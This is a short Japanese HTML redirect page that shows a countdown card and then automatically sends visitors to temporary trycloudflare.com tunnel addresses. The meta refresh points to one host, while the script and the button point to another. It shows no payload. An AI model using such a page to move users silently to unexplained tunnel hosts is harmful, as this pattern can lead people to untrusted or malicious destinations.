<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="refresh" content="3;url=https://finishing-households-radio-bold.trycloudflare.com/">
  <title>リダイレクト中...</title>
  <style>
    *, *::before, *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    :root {
      --bg: #0d0d0d;
      --surface: #161616;
      --border: #2a2a2a;
      --accent: #4f8ef7;
      --accent-glow: rgba(79, 142, 247, 0.15);
      --text-primary: #f0f0f0;
      --text-secondary: #888;
      --progress-bg: #1e1e1e;
    }

    body {
      background: var(--bg);
      color: var(--text-primary);
      font-family: 'Helvetica Neue', Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    /* 背景グリッド */
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background-image:
        linear-gradient(var(--border) 1px, transparent 1px),
        linear-gradient(90deg, var(--border) 1px, transparent 1px);
      background-size: 48px 48px;
      opacity: 0.4;
      pointer-events: none;
    }

    .card {
      position: relative;
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 48px 56px;
      width: 420px;
      max-width: calc(100vw - 32px);
      text-align: center;
      box-shadow:
        0 0 0 1px rgba(255,255,255,0.03),
        0 24px 64px rgba(0,0,0,0.6),
        0 0 80px var(--accent-glow);
      animation: fadeIn 0.5s ease both;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(12px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    /* アイコン */
    .icon-wrap {
      width: 64px;
      height: 64px;
      margin: 0 auto 28px;
      background: var(--accent-glow);
      border: 1px solid rgba(79,142,247,0.3);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .icon-wrap svg {
      width: 28px;
      height: 28px;
    }

    h1 {
      font-size: 20px;
      font-weight: 600;
      letter-spacing: -0.3px;
      color: var(--text-primary);
      margin-bottom: 10px;
    }

    .subtitle {
      font-size: 13.5px;
      color: var(--text-secondary);
      line-height: 1.6;
      margin-bottom: 36px;
    }

    /* プログレスバー */
    .progress-track {
      background: var(--progress-bg);
      border-radius: 999px;
      height: 4px;
      overflow: hidden;
      margin-bottom: 14px;
    }

    .progress-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, var(--accent), #7ab3ff);
      border-radius: 999px;
      animation: fill 3s linear forwards;
    }

    @keyframes fill {
      from { width: 0%; }
      to   { width: 100%; }
    }

    .timer-label {
      font-size: 12px;
      color: var(--text-secondary);
      margin-bottom: 32px;
      letter-spacing: 0.3px;
    }

    .timer-label span {
      color: var(--accent);
      font-weight: 600;
    }

    /* ボタン */
    .btn {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 12px 28px;
      background: var(--accent);
      color: #fff;
      font-size: 14px;
      font-weight: 600;
      border-radius: 8px;
      text-decoration: none;
      transition: background 0.15s, box-shadow 0.15s, transform 0.1s;
      cursor: pointer;
    }

    .btn:hover {
      background: #6ba3ff;
      box-shadow: 0 0 24px rgba(79,142,247,0.4);
      transform: translateY(-1px);
    }

    .btn:active {
      transform: translateY(0);
    }

    .btn svg {
      width: 14px;
      height: 14px;
      flex-shrink: 0;
    }

    .url-hint {
      margin-top: 24px;
      font-size: 11.5px;
      color: #444;
      word-break: break-all;
    }
  </style>
</head>
<body>

  <div class="card">
    <!-- アイコン -->
    <div class="icon-wrap">
      <svg viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="10"/>
        <polyline points="12 6 12 12 16 14"/>
      </svg>
    </div>

    <h1>ページを移動しています</h1>
    <p class="subtitle">自動的にリダイレクトされます。<br>しばらくお待ちください。</p>

    <!-- プログレスバー -->
    <div class="progress-track">
      <div class="progress-fill"></div>
    </div>
    <p class="timer-label"><span id="countdown">3</span> 秒後に自動移動します</p>

    <!-- 手動ボタン -->
    <a class="btn" href="https://tampa-trailers-involving-loc.trycloudflare.com/">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
        <line x1="5" y1="12" x2="19" y2="12"/>
        <polyline points="12 5 19 12 12 19"/>
      </svg>
      今すぐ移動する
    </a>

    <p class="url-hint">tampa-trailers-involving-loc.trycloudflare.com</p>
  </div>

  <script>
    let count = 3;
    const el = document.getElementById('countdown');

    const timer = setInterval(() => {
      count--;
      if (count <= 0) {
        clearInterval(timer);
        el.textContent = '0';
        window.location.href = 'https://tampa-trailers-involving-loc.trycloudflare.com/';
      } else {
        el.textContent = count;
      }
    }, 1000);
  </script>

</body>
</html>
